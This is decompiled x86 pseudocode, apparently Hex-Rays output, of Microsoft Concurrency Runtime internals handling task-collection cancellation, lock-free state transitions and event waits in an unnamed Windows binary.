//----- (004538A6) --------------------------------------------------------
BOOL __thiscall sub_4538A6(LPVOID lpTlsValue)
{
  return sub_44AAD1(dword_500038, lpTlsValue);
}

//----- (004538B5) --------------------------------------------------------
void __cdecl sub_4538B5(void **Block)
{
  if ( Block )
  {
    sub_452BE8(Block);
    sub_44775B(Block);
  }
}

//----- (004538D9) --------------------------------------------------------
void __usercall sub_4538D9(int a1@<ecx>, int a2@<esi>)
{
  int *v2; // ebx
  int *v3; // edi
  int v4; // esi
  _DWORD *v5; // edi
  int v6; // [esp-4h] [ebp-14h]
  int v7; // [esp+0h] [ebp-10h]
  int v8; // [esp+8h] [ebp-8h] BYREF
  int v9; // [esp+Ch] [ebp-4h] BYREF

  v9 = 0;
  v2 = (int *)(a1 + 128);
  v3 = (int *)sub_453555((int *)(a1 + 128), &v9);
  if ( v3 )
  {
    v6 = a2;
    do
    {
      v4 = *v3;
      if ( !*v3 )
      {
        ++v9;
        v4 = sub_453555(v2, &v9);
      }
      if ( sub_454489((_DWORD *)v3[2]) )
      {
        v5 = (_DWORD *)v3[2];
        v8 = sub_4544E0(v5);
        sub_45337B((unsigned int *)v2, &v8, 0);
        if ( v5 )
        {
          sub_453CA7(v6, v7);
          sub_44775B(v5);
        }
      }
      v3 = (int *)v4;
    }
    while ( v4 );
  }
}
// 4538D9: could not find valid save-restore pair for esi
// 45393E: variable 'v6' is possibly undefined
// 45393E: variable 'v7' is possibly undefined
// 453CA7: using guessed type _DWORD __cdecl sub_453CA7(_DWORD, _DWORD);

//----- (0045395B) --------------------------------------------------------
int __thiscall sub_45395B(
        volatile __int32 **this,
        unsigned __int8 (__cdecl *a2)(int, int),
        int a3,
        int (__cdecl *a4)(int, int))
{
  return sub_45BC5B(this[8], a2, a3, a4);
}

//----- (00453967) --------------------------------------------------------
int __thiscall sub_453967(void *this)
{
  int v2; // edi
  int v3; // ebx
  int v4; // edx
  int v5; // ecx
  int v7; // [esp+10h] [ebp-18h] BYREF
  int v8; // [esp+14h] [ebp-14h]
  volatile __int32 *v9; // [esp+18h] [ebp-10h]
  int v10; // [esp+24h] [ebp-4h]

  v9 = (volatile __int32 *)*((_DWORD *)this + 4);
  sub_44AE12(v9);
  v2 = *((_DWORD *)this + 1) - 1;
  v7 = 0;
  v8 = 0;
  v3 = 0;
  *((_DWORD *)this + 1) = v2;
  v10 = 0;
  if ( *(_DWORD *)this > v2 )
  {
    *((_DWORD *)this + 1) = v2 + 1;
  }
  else
  {
    v4 = v2 & *((_DWORD *)this + 2);
    v5 = *((_DWORD *)this + 8);
    v3 = *(_DWORD *)(*((_DWORD *)this + 7) + 4 * v4);
    v7 = *(_DWORD *)(v5 + 8 * v4);
    v8 = *(_DWORD *)(v5 + 8 * v4 + 4);
  }
  if ( *(_DWORD *)this >= v2 )
  {
    *((_DWORD *)this + 3) += *(_DWORD *)this;
    *(_DWORD *)this = 0;
    *((_DWORD *)this + 1) = 0;
    *((_DWORD *)this + 6) = 0;
    *((_BYTE *)this + 20) = 0;
  }
  if ( (v3 & 1) != 0 )
  {
    v3 &= ~1u;
    if ( !sub_453082(&v7, 0) )
      v3 = 1;
  }
  v10 = 2;
  sub_44AE53(v9);
  return v3;
}

//----- (00453A00) --------------------------------------------------------
int __cdecl sub_453A00(char a1, char a2, int a3, int a4)
{
  int result; // eax
  _DWORD v5[16]; // [esp+4h] [ebp-40h] BYREF

  if ( dword_500098 )
  {
    memset((char *)v5 + 2, 0, 0x3Eu);
    v5[11] = 0x20000;
    LOWORD(v5[0]) = 64;
    LOBYTE(v5[1]) = a1;
    BYTE1(v5[1]) = a2;
    v5[6] = dword_493F9C[0];
    v5[7] = dword_493F9C[1];
    v5[8] = dword_493F9C[2];
    v5[9] = dword_493F9C[3];
    v5[13] = a3;
    v5[14] = a4;
    return sub_456D33(dword_500098, dword_500090, dword_500094, (int)v5);
  }
  return result;
}
// 493F9C: using guessed type _DWORD dword_493F9C[4];
// 500090: using guessed type int dword_500090;
// 500094: using guessed type int dword_500094;

//----- (00453A71) --------------------------------------------------------
int __stdcall sub_453A71(char a1, unsigned __int8 a2, int a3, int a4)
{
  int result; // eax

  if ( a2 <= (unsigned __int8)byte_50008C )
  {
    result = dword_500088;
    if ( (dword_500088 & 2) != 0 )
      return sub_453A00(a1, a2, a3, a4);
  }
  return result;
}
// 500088: using guessed type int dword_500088;
// 50008C: using guessed type char byte_50008C;

//----- (00453A9E) --------------------------------------------------------
int __thiscall sub_453A9E(__int32 *this, int a2)
{
  __int32 v2; // esi
  __int32 v4; // ebx

  v2 = a2 - this[3];
  if ( v2 == this[1] - 1 )
    return sub_453586(this);
  if ( v2 >= this[1] || v2 < *this )
    return 0;
  v4 = _InterlockedExchange((volatile __int32 *)(this[7] + 4 * (v2 & this[2])), 0);
  if ( (v4 & 1) == 0 )
    return v4;
  v4 &= ~1u;
  if ( sub_453082((int *)(this[8] + 8 * (v2 & this[2])), 0) )
    return v4;
  else
    return 1;
}

//----- (00453B01) --------------------------------------------------------
int __thiscall sub_453B01(_DWORD *this, int a2)
{
  return sub_453A9E((__int32 *)(this[8] + 76), a2);
}

//----- (00453B10) --------------------------------------------------------
int __thiscall sub_453B10(_DWORD *this)
{
  if ( (this[1] & 0xFFFFFFF) == 0xFFFFFFF )
    return 0;
  else
    return *this;
}

//----- (00453B24) --------------------------------------------------------
int __thiscall sub_453B24(int this, int a2, int a3, int a4)
{
  int result; // eax

  sub_406890((char *)this, a4);
  *(_DWORD *)(this + 108) = a2;
  *(_DWORD *)(this + 112) = a3;
  result = this;
  *(_DWORD *)this = &Concurrency::details::CancellationTokenRegistration_TaskProc::`vftable';
  return result;
}
// 493CB8: using guessed type void *Concurrency::details::CancellationTokenRegistration_TaskProc::`vftable';

//----- (00453B4F) --------------------------------------------------------
char *__thiscall sub_453B4F(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &Concurrency::details::_Interruption_exception::`vftable';
  return this;
}
// 493C90: using guessed type void *Concurrency::details::_Interruption_exception::`vftable';

//----- (00453B7B) --------------------------------------------------------
volatile __int32 *__thiscall sub_453B7B(volatile __int32 *this, int a2, char a3)
{
  int v4; // eax
  int v5; // eax
  volatile signed __int32 *v6; // edx
  signed __int32 v7; // esi
  signed __int32 i; // eax
  _DWORD *v9; // eax
  int v10; // eax

  *((_DWORD *)this + 1) |= 0xFFFFFFFu;
  *((_DWORD *)this + 2) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 5) = 0x80000000;
  *((_DWORD *)this + 6) = 0;
  *((_DWORD *)this + 14) = 0;
  sub_448E4C((_DWORD *)this + 15);
  *((_DWORD *)this + 25) = *(_DWORD *)(a2 + 100);
  *((_DWORD *)this + 27) = 0;
  *((_DWORD *)this + 30) = 0;
  *((_DWORD *)this + 33) = 0;
  *((_DWORD *)this + 34) = 0;
  v4 = sub_44A028();
  *((_DWORD *)this + 3) = v4;
  *this = *(_DWORD *)(v4 + 52);
  v5 = *(_DWORD *)(a2 + 8);
  *((_DWORD *)this + 2) = v5;
  if ( v5 && v5 != 2 )
    _InterlockedIncrement((volatile signed __int32 *)(v5 + 4));
  sub_454444(this);
  sub_44982B(this + 15);
  if ( a3 )
  {
    v6 = (volatile signed __int32 *)(*((_DWORD *)this + 25) + 104);
    v7 = *v6;
    *((_DWORD *)this + 26) = *v6;
    for ( i = _InterlockedCompareExchange(v6, (signed __int32)this, v7);
          i != v7;
          i = _InterlockedCompareExchange(
                (volatile signed __int32 *)(*((_DWORD *)this + 25) + 104),
                (signed __int32)this,
                i) )
    {
      *((_DWORD *)this + 26) = i;
      v7 = i;
    }
  }
  else
  {
    *((_DWORD *)this + 30) |= 1u;
    *((_DWORD *)this + 26) = 0;
  }
  v9 = sub_4501C0();
  v10 = sub_453E47(v9);
  *((_DWORD *)this + 1) &= 0xFFFFFFFu;
  *((_DWORD *)this + 32) = v10;
  return this;
}
// 44A028: using guessed type int sub_44A028(void);

//----- (00453C5C) --------------------------------------------------------
char *__thiscall sub_453C5C(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &Concurrency::missing_wait::`vftable';
  return this;
}
// 493BE0: using guessed type void *Concurrency::missing_wait::`vftable';

//----- (00453C77) --------------------------------------------------------
void __thiscall sub_453C77(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax

  v1 = this[1];
  *this = &Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable';
  if ( v1 )
  {
    v2 = (_DWORD *)(v1 - 8);
    if ( *v2 == 56797 )
      free(v2);
  }
}
// 493CC8: using guessed type void *Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable';

//----- (00453C97) --------------------------------------------------------
void __thiscall sub_453C97(void **this)
{
  if ( this[2] )
    j_j__free(this[2]);
}

//----- (00453CA7) --------------------------------------------------------
void __thiscall sub_453CA7(int this)
{
  bool v2; // bl
  _DWORD *v3; // ecx
  _DWORD *v4; // esi
  void *v5; // esi
  void *v6; // esi
  volatile signed __int32 *v7; // ecx
  char pExceptionObject[12]; // [esp+10h] [ebp-18h] BYREF

  v2 = 0;
  if ( !sub_45445A((_DWORD *)this) )
  {
    v2 = !sub_4546A9((_DWORD *)this, 0);
    if ( *(_DWORD *)(this + 100) == this )
    {
      v3 = *(_DWORD **)(this + 104);
      if ( v3 )
      {
        do
        {
          v4 = (_DWORD *)v3[26];
          sub_454521(v3);
          v3 = v4;
        }
        while ( v4 );
      }
    }
  }
  v5 = *(void **)(this + 108);
  if ( v5 )
  {
    sub_453C97(*(void ***)(this + 108));
    sub_44775B(v5);
  }
  v6 = (void *)(*(_DWORD *)(this + 24) & 0xFFFFFFFC);
  if ( v6 && v6 != (void *)12 )
  {
    __ExceptionPtrDestroy((void *)(*(_DWORD *)(this + 24) & 0xFFFFFFFC));
    sub_44775B(v6);
  }
  v7 = *(volatile signed __int32 **)(this + 8);
  if ( v7 && v7 != (volatile signed __int32 *)2 )
    sub_406830(v7);
  if ( v2 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVmissing_wait_Concurrency__);
  }
  sub_448EF7((_DWORD *)(this + 60));
}

//----- (00453D80) --------------------------------------------------------
_DWORD *__thiscall sub_453D80(_DWORD *Block, char a2)
{
  sub_453C77(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00453DA2) --------------------------------------------------------
char *__thiscall sub_453DA2(char *Block, char a2)
{
  sub_4068E0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00453DC4) --------------------------------------------------------
_DWORD *__thiscall sub_453DC4(unsigned int *this, int a2, int a3)
{
  sub_4538D9((int)this, (int)this);
  return sub_45119C(this + 32, &a2, &a3);
}

//----- (00453DE7) --------------------------------------------------------
_DWORD *__thiscall sub_453DE7(unsigned int *this, int a2)
{
  unsigned int *v2; // edi
  _DWORD *v3; // eax
  _DWORD *v4; // esi
  _DWORD *v5; // ecx
  int v7; // [esp+8h] [ebp-4h] BYREF

  v2 = this + 32;
  v3 = sub_45032E(this + 32, &a2, 0);
  if ( !v3 )
    return 0;
  v4 = (_DWORD *)v3[2];
  v5 = v4;
  if ( v4 && (v4[30] & 2) != 0 )
  {
    v7 = v4[25];
    sub_45337B(v2, &v7, 0);
    sub_453CA7();
    sub_44775B(v4);
    return 0;
  }
  return v5;
}

//----- (00453E47) --------------------------------------------------------
int __thiscall sub_453E47(_DWORD *this)
{
  int v2; // eax

  v2 = this[8];
  if ( !v2 )
  {
    sub_453153((int)this);
    v2 = this[8];
  }
  return *(_DWORD *)(v2 + 64);
}

//----- (00453E5E) --------------------------------------------------------
void __thiscall sub_453E5E(int this, char a2)
{
  volatile __int32 **v3; // eax
  int v4; // ebx
  int v5; // edi
  int i; // eax
  int v7; // ecx
  int v8; // eax
  int v9; // ecx
  volatile __int32 *v10; // eax
  int v11; // eax
  volatile __int32 **v12; // [esp+14h] [ebp-4h]

  v3 = (volatile __int32 **)sub_4501C0();
  v4 = *(_DWORD *)(this + 108);
  v12 = v3;
  if ( sub_45446C((_DWORD *)this) )
    v5 = 0;
  else
    v5 = *(_DWORD *)(*(_DWORD *)(this + 100) + 104);
  if ( v4 && *(_BYTE *)(v4 + 12) )
  {
    sub_453F8D((void *)this, v12);
    *(_BYTE *)(v4 + 12) = 0;
  }
  else
  {
    for ( i = *(_DWORD *)(this + 132); i > 0; i = *(_DWORD *)(this + 132) )
    {
      if ( (unsigned int)i <= 2 )
      {
        v7 = *(_DWORD *)(this + 4 * i + 108);
      }
      else
      {
        --*(_DWORD *)(v4 + 4);
        v7 = *(_DWORD *)(*(_DWORD *)(v4 + 8) + 4 * *(_DWORD *)(v4 + 4));
        i = *(_DWORD *)(this + 132);
      }
      *(_DWORD *)(this + 132) = i - 1;
      v8 = sub_453B01(v12, v7);
      v9 = v8;
      if ( !v8 )
        break;
      if ( v8 != 1 )
      {
        v10 = v12[39];
        if ( *((_BYTE *)v12 + 76) )
          ++*((_DWORD *)v10 + 3);
        else
          ++*((_DWORD *)v10 + 27);
        *(_DWORD *)(v9 + 8) = 0;
        sub_454491(this, v9);
      }
    }
  }
  while ( 1 )
  {
    if ( a2 || *(int *)(this + 16) > 0 || sub_45445A((_DWORD *)this) || v5 )
      sub_4540A6(*(volatile __int32 **)(this + 100), 0, v5);
    sub_4542ED((_DWORD ***)this, v5);
    v11 = sub_45446C((_DWORD *)this) ? 0 : *(_DWORD *)(*(_DWORD *)(this + 100) + 104);
    if ( v5 == v11 )
      break;
    v5 = v11;
  }
  *(_DWORD *)(this + 132) = 0;
  if ( v4 )
    *(_DWORD *)(v4 + 4) = 0;
  if ( !a2 )
    sub_45455B(this, v5);
}

//----- (00453F8D) --------------------------------------------------------
int __thiscall sub_453F8D(void *this, volatile __int32 **a2)
{
  int result; // eax
  _BYTE *v3; // eax
  bool v4; // zf
  int v5; // ecx
  void *v6; // [esp+0h] [ebp-8h] BYREF
  int v7; // [esp+4h] [ebp-4h]

  v7 = 0;
  v6 = this;
  result = sub_45395B(
             a2,
             (unsigned __int8 (__cdecl *)(int, int))sub_454298,
             (int)&v6,
             (int (__cdecl *)(int, int))sub_454690);
  if ( v7 )
  {
    v3 = sub_4501C0();
    v4 = v3[76] == 0;
    v5 = *((_DWORD *)v3 + 39);
    result = v7;
    if ( v4 )
      *(_DWORD *)(v5 + 108) += v7;
    else
      *(_DWORD *)(v5 + 12) += v7;
  }
  return result;
}

//----- (00453FD5) --------------------------------------------------------
volatile __int32 *__thiscall sub_453FD5(_DWORD *this)
{
  unsigned int *v2; // ebx
  int v3; // eax
  volatile __int32 *result; // eax
  volatile __int32 *v5; // eax
  volatile __int32 *v6; // edi

  v2 = (unsigned int *)sub_44A028();
  v3 = sub_453E47(v2);
  if ( v2 == (unsigned int *)this[3] && v3 == this[32] )
    return this;
  result = (volatile __int32 *)sub_453419(v2);
  if ( !result || *((_DWORD **)result + 25) != this )
  {
    result = sub_453DE7(v2, (int)this);
    if ( !result )
    {
      v5 = (volatile __int32 *)operator new(0x90u);
      v6 = 0;
      if ( v5 )
        v6 = sub_453B7B(v5, (int)this, 1);
      sub_453DC4(v2, (int)this, (int)v6);
      return v6;
    }
  }
  return result;
}
// 44A028: using guessed type int sub_44A028(void);

//----- (00454056) --------------------------------------------------------
void __thiscall sub_454056(int this)
{
  int v2; // ecx

  if ( !*(_DWORD *)(this + 12) )
    *(_DWORD *)(this + 12) = sub_44A028();
  if ( sub_45B91A((volatile signed __int32 *)this) )
  {
    v2 = *(_DWORD *)(this + 12);
    if ( (16 * *(_DWORD *)(this + 4)) >> 4 < 0 )
    {
      _InterlockedIncrement((volatile signed __int32 *)(v2 + 120));
      sub_45B8CC((volatile signed __int32 *)this, 2);
    }
    else
    {
      sub_452EEA(v2, (16 * *(_DWORD *)(this + 4)) >> 4);
      sub_45B8CC((volatile signed __int32 *)this, 3);
    }
    sub_452F81(*(_DWORD *)(this + 12), this);
  }
}

//----- (004540A6) --------------------------------------------------------
void __thiscall sub_4540A6(volatile __int32 *this, int a2, int a3)
{
  volatile __int32 *v4; // edi
  int v5; // edi
  volatile __int32 *v6; // ebx
  volatile __int32 v7; // edi
  volatile __int32 **v8; // [esp+8h] [ebp-4h]

  v4 = sub_453FD5(this);
  if ( sub_454656(this, 1) )
  {
    if ( sub_45446C(v4) || v4 == this )
    {
      v6 = this + 14;
      do
      {
        while ( 1 )
        {
          v7 = *v6;
          if ( *v6 != 1 && v7 != 5 )
            break;
          v8 = (volatile __int32 **)*((_DWORD *)this + 3);
          sub_452EEA((int)v8, (16 * *((_DWORD *)this + 1)) >> 4);
          if ( v7 == 5 )
            sub_453F8D((void *)this, v8);
          _InterlockedExchange(v6, 4);
        }
      }
      while ( _InterlockedCompareExchange(v6, 3, 0) != v7 );
      v5 = a2;
      sub_454208((int)this, a2, 1);
    }
    else
    {
      v5 = a2;
      sub_454164(this, a2);
    }
    sub_454145(v5, a3);
  }
}

//----- (00454145) --------------------------------------------------------
void __stdcall sub_454145(int a1, int a2)
{
  while ( a2 )
  {
    sub_454164((volatile signed __int32 *)a2, a1);
    a2 = *(_DWORD *)(a2 + 104);
  }
}

//----- (00454164) --------------------------------------------------------
void __thiscall sub_454164(volatile signed __int32 *this, int a2)
{
  signed __int32 v2; // esi
  char v3; // bl
  signed __int32 v4; // edx
  signed __int32 v5; // eax
  int v6; // ecx
  int v7; // [esp-4h] [ebp-20h]
  volatile __int32 **v8; // [esp+Ch] [ebp-10h]
  volatile signed __int32 *v9; // [esp+10h] [ebp-Ch]
  char v10; // [esp+14h] [ebp-8h]

  v2 = *((_DWORD *)this + 14);
  v3 = 0;
  v9 = this + 14;
  v4 = 0;
  while ( 1 )
  {
    if ( !v2 )
    {
      v7 = 3;
      goto LABEL_9;
    }
    if ( v2 == 1 || v2 == 5 )
    {
      v7 = 9;
LABEL_9:
      v4 = v7;
      goto LABEL_10;
    }
    if ( !v4 )
      return;
LABEL_10:
    v5 = _InterlockedCompareExchange(v9, v4, v2);
    v6 = (int)this;
    v4 = v5;
    if ( v5 == v2 )
      break;
    v2 = v5;
  }
  v10 = 0;
  if ( v2 == 1 || v2 == 5 )
  {
    v3 = 1;
    v10 = 1;
    v8 = (volatile __int32 **)*((_DWORD *)this + 3);
    sub_452EEA((int)v8, (16 * *((_DWORD *)this + 1)) >> 4);
    v6 = (int)this;
    if ( v2 == 5 )
    {
      sub_453F8D((void *)this, v8);
      v6 = (int)this;
    }
  }
  sub_454208(v6, a2, v10);
  if ( v3 )
    _InterlockedExchange(v9, 4);
}

//----- (00454208) --------------------------------------------------------
void __thiscall sub_454208(int this, int a2, char a3)
{
  int *v4; // ebx
  int v5; // eax
  int i; // edi
  volatile signed __int32 *v7; // [esp+14h] [ebp-10h]

  v4 = (int *)(this + 28);
  v7 = (volatile signed __int32 *)(this + 32);
  sub_44A1F0((volatile signed __int32 *)(this + 32));
  if ( a3 )
    goto LABEL_4;
  if ( *(int *)(this + 48) <= 0 )
    goto LABEL_5;
  v5 = *v4;
  if ( !*v4 )
  {
LABEL_4:
    sub_452F81(*(_DWORD *)(this + 12), this);
LABEL_5:
    v5 = *v4;
    if ( !*v4 )
      goto LABEL_9;
  }
  for ( i = *(_DWORD *)(v5 + 4); i; i = *(_DWORD *)(i + 4) )
  {
    _InterlockedExchange((volatile __int32 *)(i + 24), 1);
    sub_452EEA(i - 92, -999);
    sub_452F81(i - 92, 0);
    if ( i == *v4 )
      break;
  }
LABEL_9:
  sub_44A336(v7);
}

//----- (00454298) --------------------------------------------------------
bool __cdecl sub_454298(int a1, _DWORD *a2)
{
  return *(_DWORD *)(a1 + 8) == *a2;
}

//----- (004542AB) --------------------------------------------------------
signed __int32 __thiscall sub_4542AB(int this)
{
  volatile signed __int32 *v2; // edi
  signed __int32 result; // eax

  v2 = (volatile signed __int32 *)(this + 20);
  if ( *(_DWORD *)(this + 20) == 0x80000000 || *(_DWORD *)(this + 20) == -2147483647 )
    sub_4543F9(this);
  result = _InterlockedIncrement(v2);
  if ( !result )
    return sub_449320((volatile signed __int32 *)(this + 28));
  return result;
}

//----- (004542D9) --------------------------------------------------------
int __thiscall sub_4542D9(int this)
{
  return (*(int (__cdecl **)(_DWORD))(this + 108))(*(_DWORD *)(this + 112));
}

//----- (004542ED) --------------------------------------------------------
void __thiscall sub_4542ED(_DWORD ***this, int a2)
{
  int v2; // ebx
  int v3; // eax
  int v4; // edi
  unsigned int v5; // ecx
  unsigned int v6; // eax
  void *v7; // esp
  _DWORD *v8; // esi
  _DWORD *v9; // eax
  _DWORD *v10; // esi
  int v11; // ecx
  signed int v12; // edi
  _DWORD *v13; // esi
  _DWORD v14[4]; // [esp+0h] [ebp-3Ch] BYREF
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-2Ch] BYREF
  _DWORD *v16; // [esp+20h] [ebp-1Ch]
  int v17; // [esp+24h] [ebp-18h]
  _DWORD ***v18; // [esp+28h] [ebp-14h]
  int v19; // [esp+38h] [ebp-4h]

  v18 = this;
  v2 = a2;
  v3 = a2;
  v4 = 0;
  if ( !a2 )
    goto LABEL_15;
  do
  {
    v3 = *(_DWORD *)(v3 + 104);
    ++v4;
  }
  while ( v3 );
  if ( v4 <= 0 )
  {
LABEL_15:
    sub_4499D8(this + 15, 0xFFFFFFFF);
    return;
  }
  pExceptionObject[3] = &Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable';
  v16 = 0;
  v17 = 0;
  v19 = 0;
  v5 = 4 * v4 + 12;
  v6 = 4 * v4 + 4 < v5 ? v5 : 0;
  if ( !v6 )
    goto LABEL_17;
  if ( v6 > 0x400 )
  {
    v9 = malloc(4 * v4 + 4 < v5 ? v5 : 0);
    v8 = v9;
    if ( !v9 )
      goto LABEL_17;
    *v9 = 56797;
  }
  else
  {
    v7 = alloca(v6);
    v8 = v14;
    if ( !v14 )
      goto LABEL_17;
    v14[0] = 52428;
  }
  v10 = v8 + 2;
  if ( !v10 )
  {
LABEL_17:
    sub_42E414(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  v17 = 0;
  v11 = 1;
  v16 = v10;
  v12 = v4 + 1;
  *v10 = v18[25] + 15;
  if ( v12 > 1 )
  {
    do
    {
      v10[v11++] = v2 + 60;
      v2 = *(_DWORD *)(v2 + 104);
    }
    while ( v11 < v12 );
  }
  sub_449BA1(v10, v12, 1, 0xFFFFFFFF);
  v13 = v10 - 2;
  if ( *v13 == 56797 )
    free(v13);
}
// 493CC8: using guessed type void *Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable';

//----- (004543F5) --------------------------------------------------------
char *__thiscall sub_4543F5(char *this)
{
  return this + 28;
}

//----- (004543F9) --------------------------------------------------------
char __thiscall sub_4543F9(int this)
{
  volatile __int32 *v1; // esi
  signed __int32 v2; // eax
  char v4[8]; // [esp+Ch] [ebp-10h] BYREF
  int v5; // [esp+14h] [ebp-8h]
  int (*v6)(); // [esp+18h] [ebp-4h]

  v1 = (volatile __int32 *)(this + 20);
  v2 = _InterlockedCompareExchange((volatile signed __int32 *)(this + 20), -2147483647, 0x80000000);
  if ( v2 == 0x80000000 )
  {
    *(_DWORD *)(this + 28) = 0;
    LOBYTE(v2) = _InterlockedExchange(v1, 0);
  }
  else
  {
    v5 = 0;
    v6 = sub_44AE9C;
    while ( *(int *)v1 <= -2147483647 )
      LOBYTE(v2) = sub_449592((int)v4);
  }
  return v2;
}
// 4543F9: using guessed type char var_10[8];

//----- (00454444) --------------------------------------------------------
_DWORD *__thiscall sub_454444(_DWORD *this)
{
  this[12] = 0;
  this[13] = 0;
  this[31] = 0;
  this[7] = 0;
  return sub_449EED(this + 8);
}

//----- (0045445A) --------------------------------------------------------
bool __thiscall sub_45445A(_DWORD *this)
{
  return (_DWORD *)this[25] != this && (this[30] & 1) == 0;
}

//----- (0045446C) --------------------------------------------------------
bool __thiscall sub_45446C(_DWORD *this)
{
  return (_DWORD *)this[25] != this && (this[30] & 1) != 0;
}

//----- (0045447E) --------------------------------------------------------
bool __thiscall sub_45447E(_DWORD *this)
{
  return *(_DWORD *)(this[25] + 52) != 0;
}

//----- (00454489) --------------------------------------------------------
bool __thiscall sub_454489(_DWORD *this)
{
  return (this[30] & 2) != 0;
}

//----- (00454491) --------------------------------------------------------
void __thiscall sub_454491(int this, int a2)
{
  void (__cdecl *v3)(int); // edi
  int v4; // ebx

  if ( *(_BYTE *)(a2 + 16) )
    sub_45BE46((int (__thiscall ***)(_DWORD, int))a2);
  v3 = *(void (__cdecl **)(int))(this + 136);
  v4 = *(_DWORD *)(this + 140);
  if ( !_InterlockedDecrement((volatile signed __int32 *)(this + 16)) )
    sub_44982B((volatile __int32 *)(this + 60));
  if ( v3 )
    v3(v4);
}

//----- (004544E0) --------------------------------------------------------
int __thiscall sub_4544E0(_DWORD *this)
{
  return this[25];
}

//----- (004544E4) --------------------------------------------------------
int __thiscall sub_4544E4(void *this, int a2, int a3, int a4)
{
  void *v5; // eax
  int v6; // esi

  v5 = operator new(0x74u);
  if ( v5 )
    v6 = sub_453B24((int)v5, a2, a3, a4);
  else
    v6 = 0;
  sub_406950((int)this, v6);
  return v6;
}

//----- (00454521) --------------------------------------------------------
void __thiscall sub_454521(volatile signed __int32 *Block)
{
  volatile signed __int32 *v2; // edi
  signed __int32 v3; // ecx
  signed __int32 v4; // eax

  v2 = Block + 30;
  v3 = *((_DWORD *)Block + 30);
  if ( (v3 & 2) != 0 )
  {
LABEL_4:
    sub_453CA7((int)Block);
    sub_44775B((void *)Block);
  }
  else
  {
    while ( 1 )
    {
      v4 = _InterlockedCompareExchange(v2, v3 | 2, v3);
      if ( v4 == v3 )
        break;
      v3 = v4;
      if ( (v4 & 2) != 0 )
        goto LABEL_4;
    }
  }
}

//----- (0045455B) --------------------------------------------------------
void __thiscall sub_45455B(int this, int a2)
{
  int v2; // edi
  volatile signed __int32 *v4; // eax
  int v5; // ecx
  volatile signed __int32 *v6; // ebx
  signed __int32 v7; // edx
  signed __int32 v8; // eax
  char v9[8]; // [esp+Ch] [ebp-28h] BYREF
  int v10; // [esp+14h] [ebp-20h]
  int (*v11)(); // [esp+18h] [ebp-1Ch]
  char v12[8]; // [esp+1Ch] [ebp-18h] BYREF
  int v13; // [esp+24h] [ebp-10h]
  int (*v14)(); // [esp+28h] [ebp-Ch]
  int v15; // [esp+2Ch] [ebp-8h]
  volatile signed __int32 *v16; // [esp+30h] [ebp-4h]

  v2 = a2;
  while ( 2 )
  {
    v4 = (volatile signed __int32 *)sub_4501C0();
    v5 = *(_DWORD *)(this + 12);
    v6 = (volatile signed __int32 *)(this + 56);
    v16 = v4;
    v15 = v5;
LABEL_3:
    v7 = *v6;
    while ( 1 )
    {
      if ( v7 == 9 )
      {
        v13 = 0;
        v14 = sub_44AE9C;
        if ( *v6 == 9 )
        {
          do
            sub_449592((int)v12);
          while ( *v6 == 9 );
          v4 = v16;
          v5 = v15;
        }
        goto LABEL_3;
      }
      if ( v4 == (volatile signed __int32 *)v5 )
        break;
      v8 = _InterlockedCompareExchange(v6, 0, 3);
      if ( v8 != 9 )
        goto LABEL_13;
LABEL_18:
      v5 = v15;
      v7 = v8;
      v4 = v16;
    }
    v8 = _InterlockedCompareExchange(v6, 0, v7);
    if ( v8 != v7 )
      goto LABEL_18;
    if ( v8 == 4 )
      sub_452F51(v16, (16 * *(_DWORD *)(this + 4)) >> 4);
    *(_DWORD *)(this + 4) |= 0xFFFFFFFu;
LABEL_13:
    if ( *(_DWORD *)(this + 100) == this )
    {
      while ( v2 )
      {
        if ( (*(_DWORD *)(v2 + 120) & 2) == 0 )
          sub_45455B(0);
        v2 = *(_DWORD *)(v2 + 104);
      }
      if ( _InterlockedExchange((volatile __int32 *)(this + 52), 0) < 0 )
      {
        v10 = 0;
        v11 = sub_44AE9C;
        while ( *(_DWORD *)(this + 24) == 8 )
          sub_449592((int)v9);
        sub_45B9A0((_DWORD *)this);
      }
    }
    else if ( sub_45445A((_DWORD *)this) && a2 )
    {
      this = *(_DWORD *)(this + 100);
      continue;
    }
    break;
  }
}
// 45455B: using guessed type char var_18[8];
// 45455B: using guessed type char var_28[8];

//----- (00454656) --------------------------------------------------------
char __thiscall sub_454656(volatile signed __int32 *this, int a2)
{
  signed __int32 v2; // edx
  signed __int32 v3; // eax

  v2 = *((_DWORD *)this + 13);
  if ( (v2 & 0x3FFFFFFF) != 0 )
    return 0;
  while ( 1 )
  {
    v3 = _InterlockedCompareExchange(this + 13, a2 | v2 & 0xC0000000, v2);
    if ( v3 == v2 )
      break;
    v2 = v3;
    if ( (v3 & 0x3FFFFFFF) != 0 )
      return 0;
  }
  return 1;
}

//----- (00454690) --------------------------------------------------------
char __cdecl sub_454690(int a1, int a2)
{
  int v2; // ecx

  v2 = *(_DWORD *)(a1 + 8);
  ++*(_DWORD *)(a2 + 4);
  sub_454491(v2, a1);
  return 1;
}

//----- (004546A9) --------------------------------------------------------
bool __thiscall sub_4546A9(_DWORD *this, char a2)
{
  bool v3; // bl
  int i; // eax
  bool v5; // zf

  v3 = 0;
  if ( sub_45445A(this) )
    return !v3;
  if ( (unsigned __int8)__uncaught_exception() )
    goto LABEL_10;
  v3 = this[4] > 0;
  if ( (_DWORD *)this[25] == this )
  {
    for ( i = this[26]; i; i = *(_DWORD *)(i + 104) )
    {
      if ( *(int *)(i + 16) > 0 )
        v3 = 1;
    }
  }
  v5 = !v3;
  if ( v3 )
  {
LABEL_10:
    sub_453E5E((int)this, a2);
    return !v3;
  }
  return v5;
}
// 4604BB: using guessed type int __uncaught_exception(void);

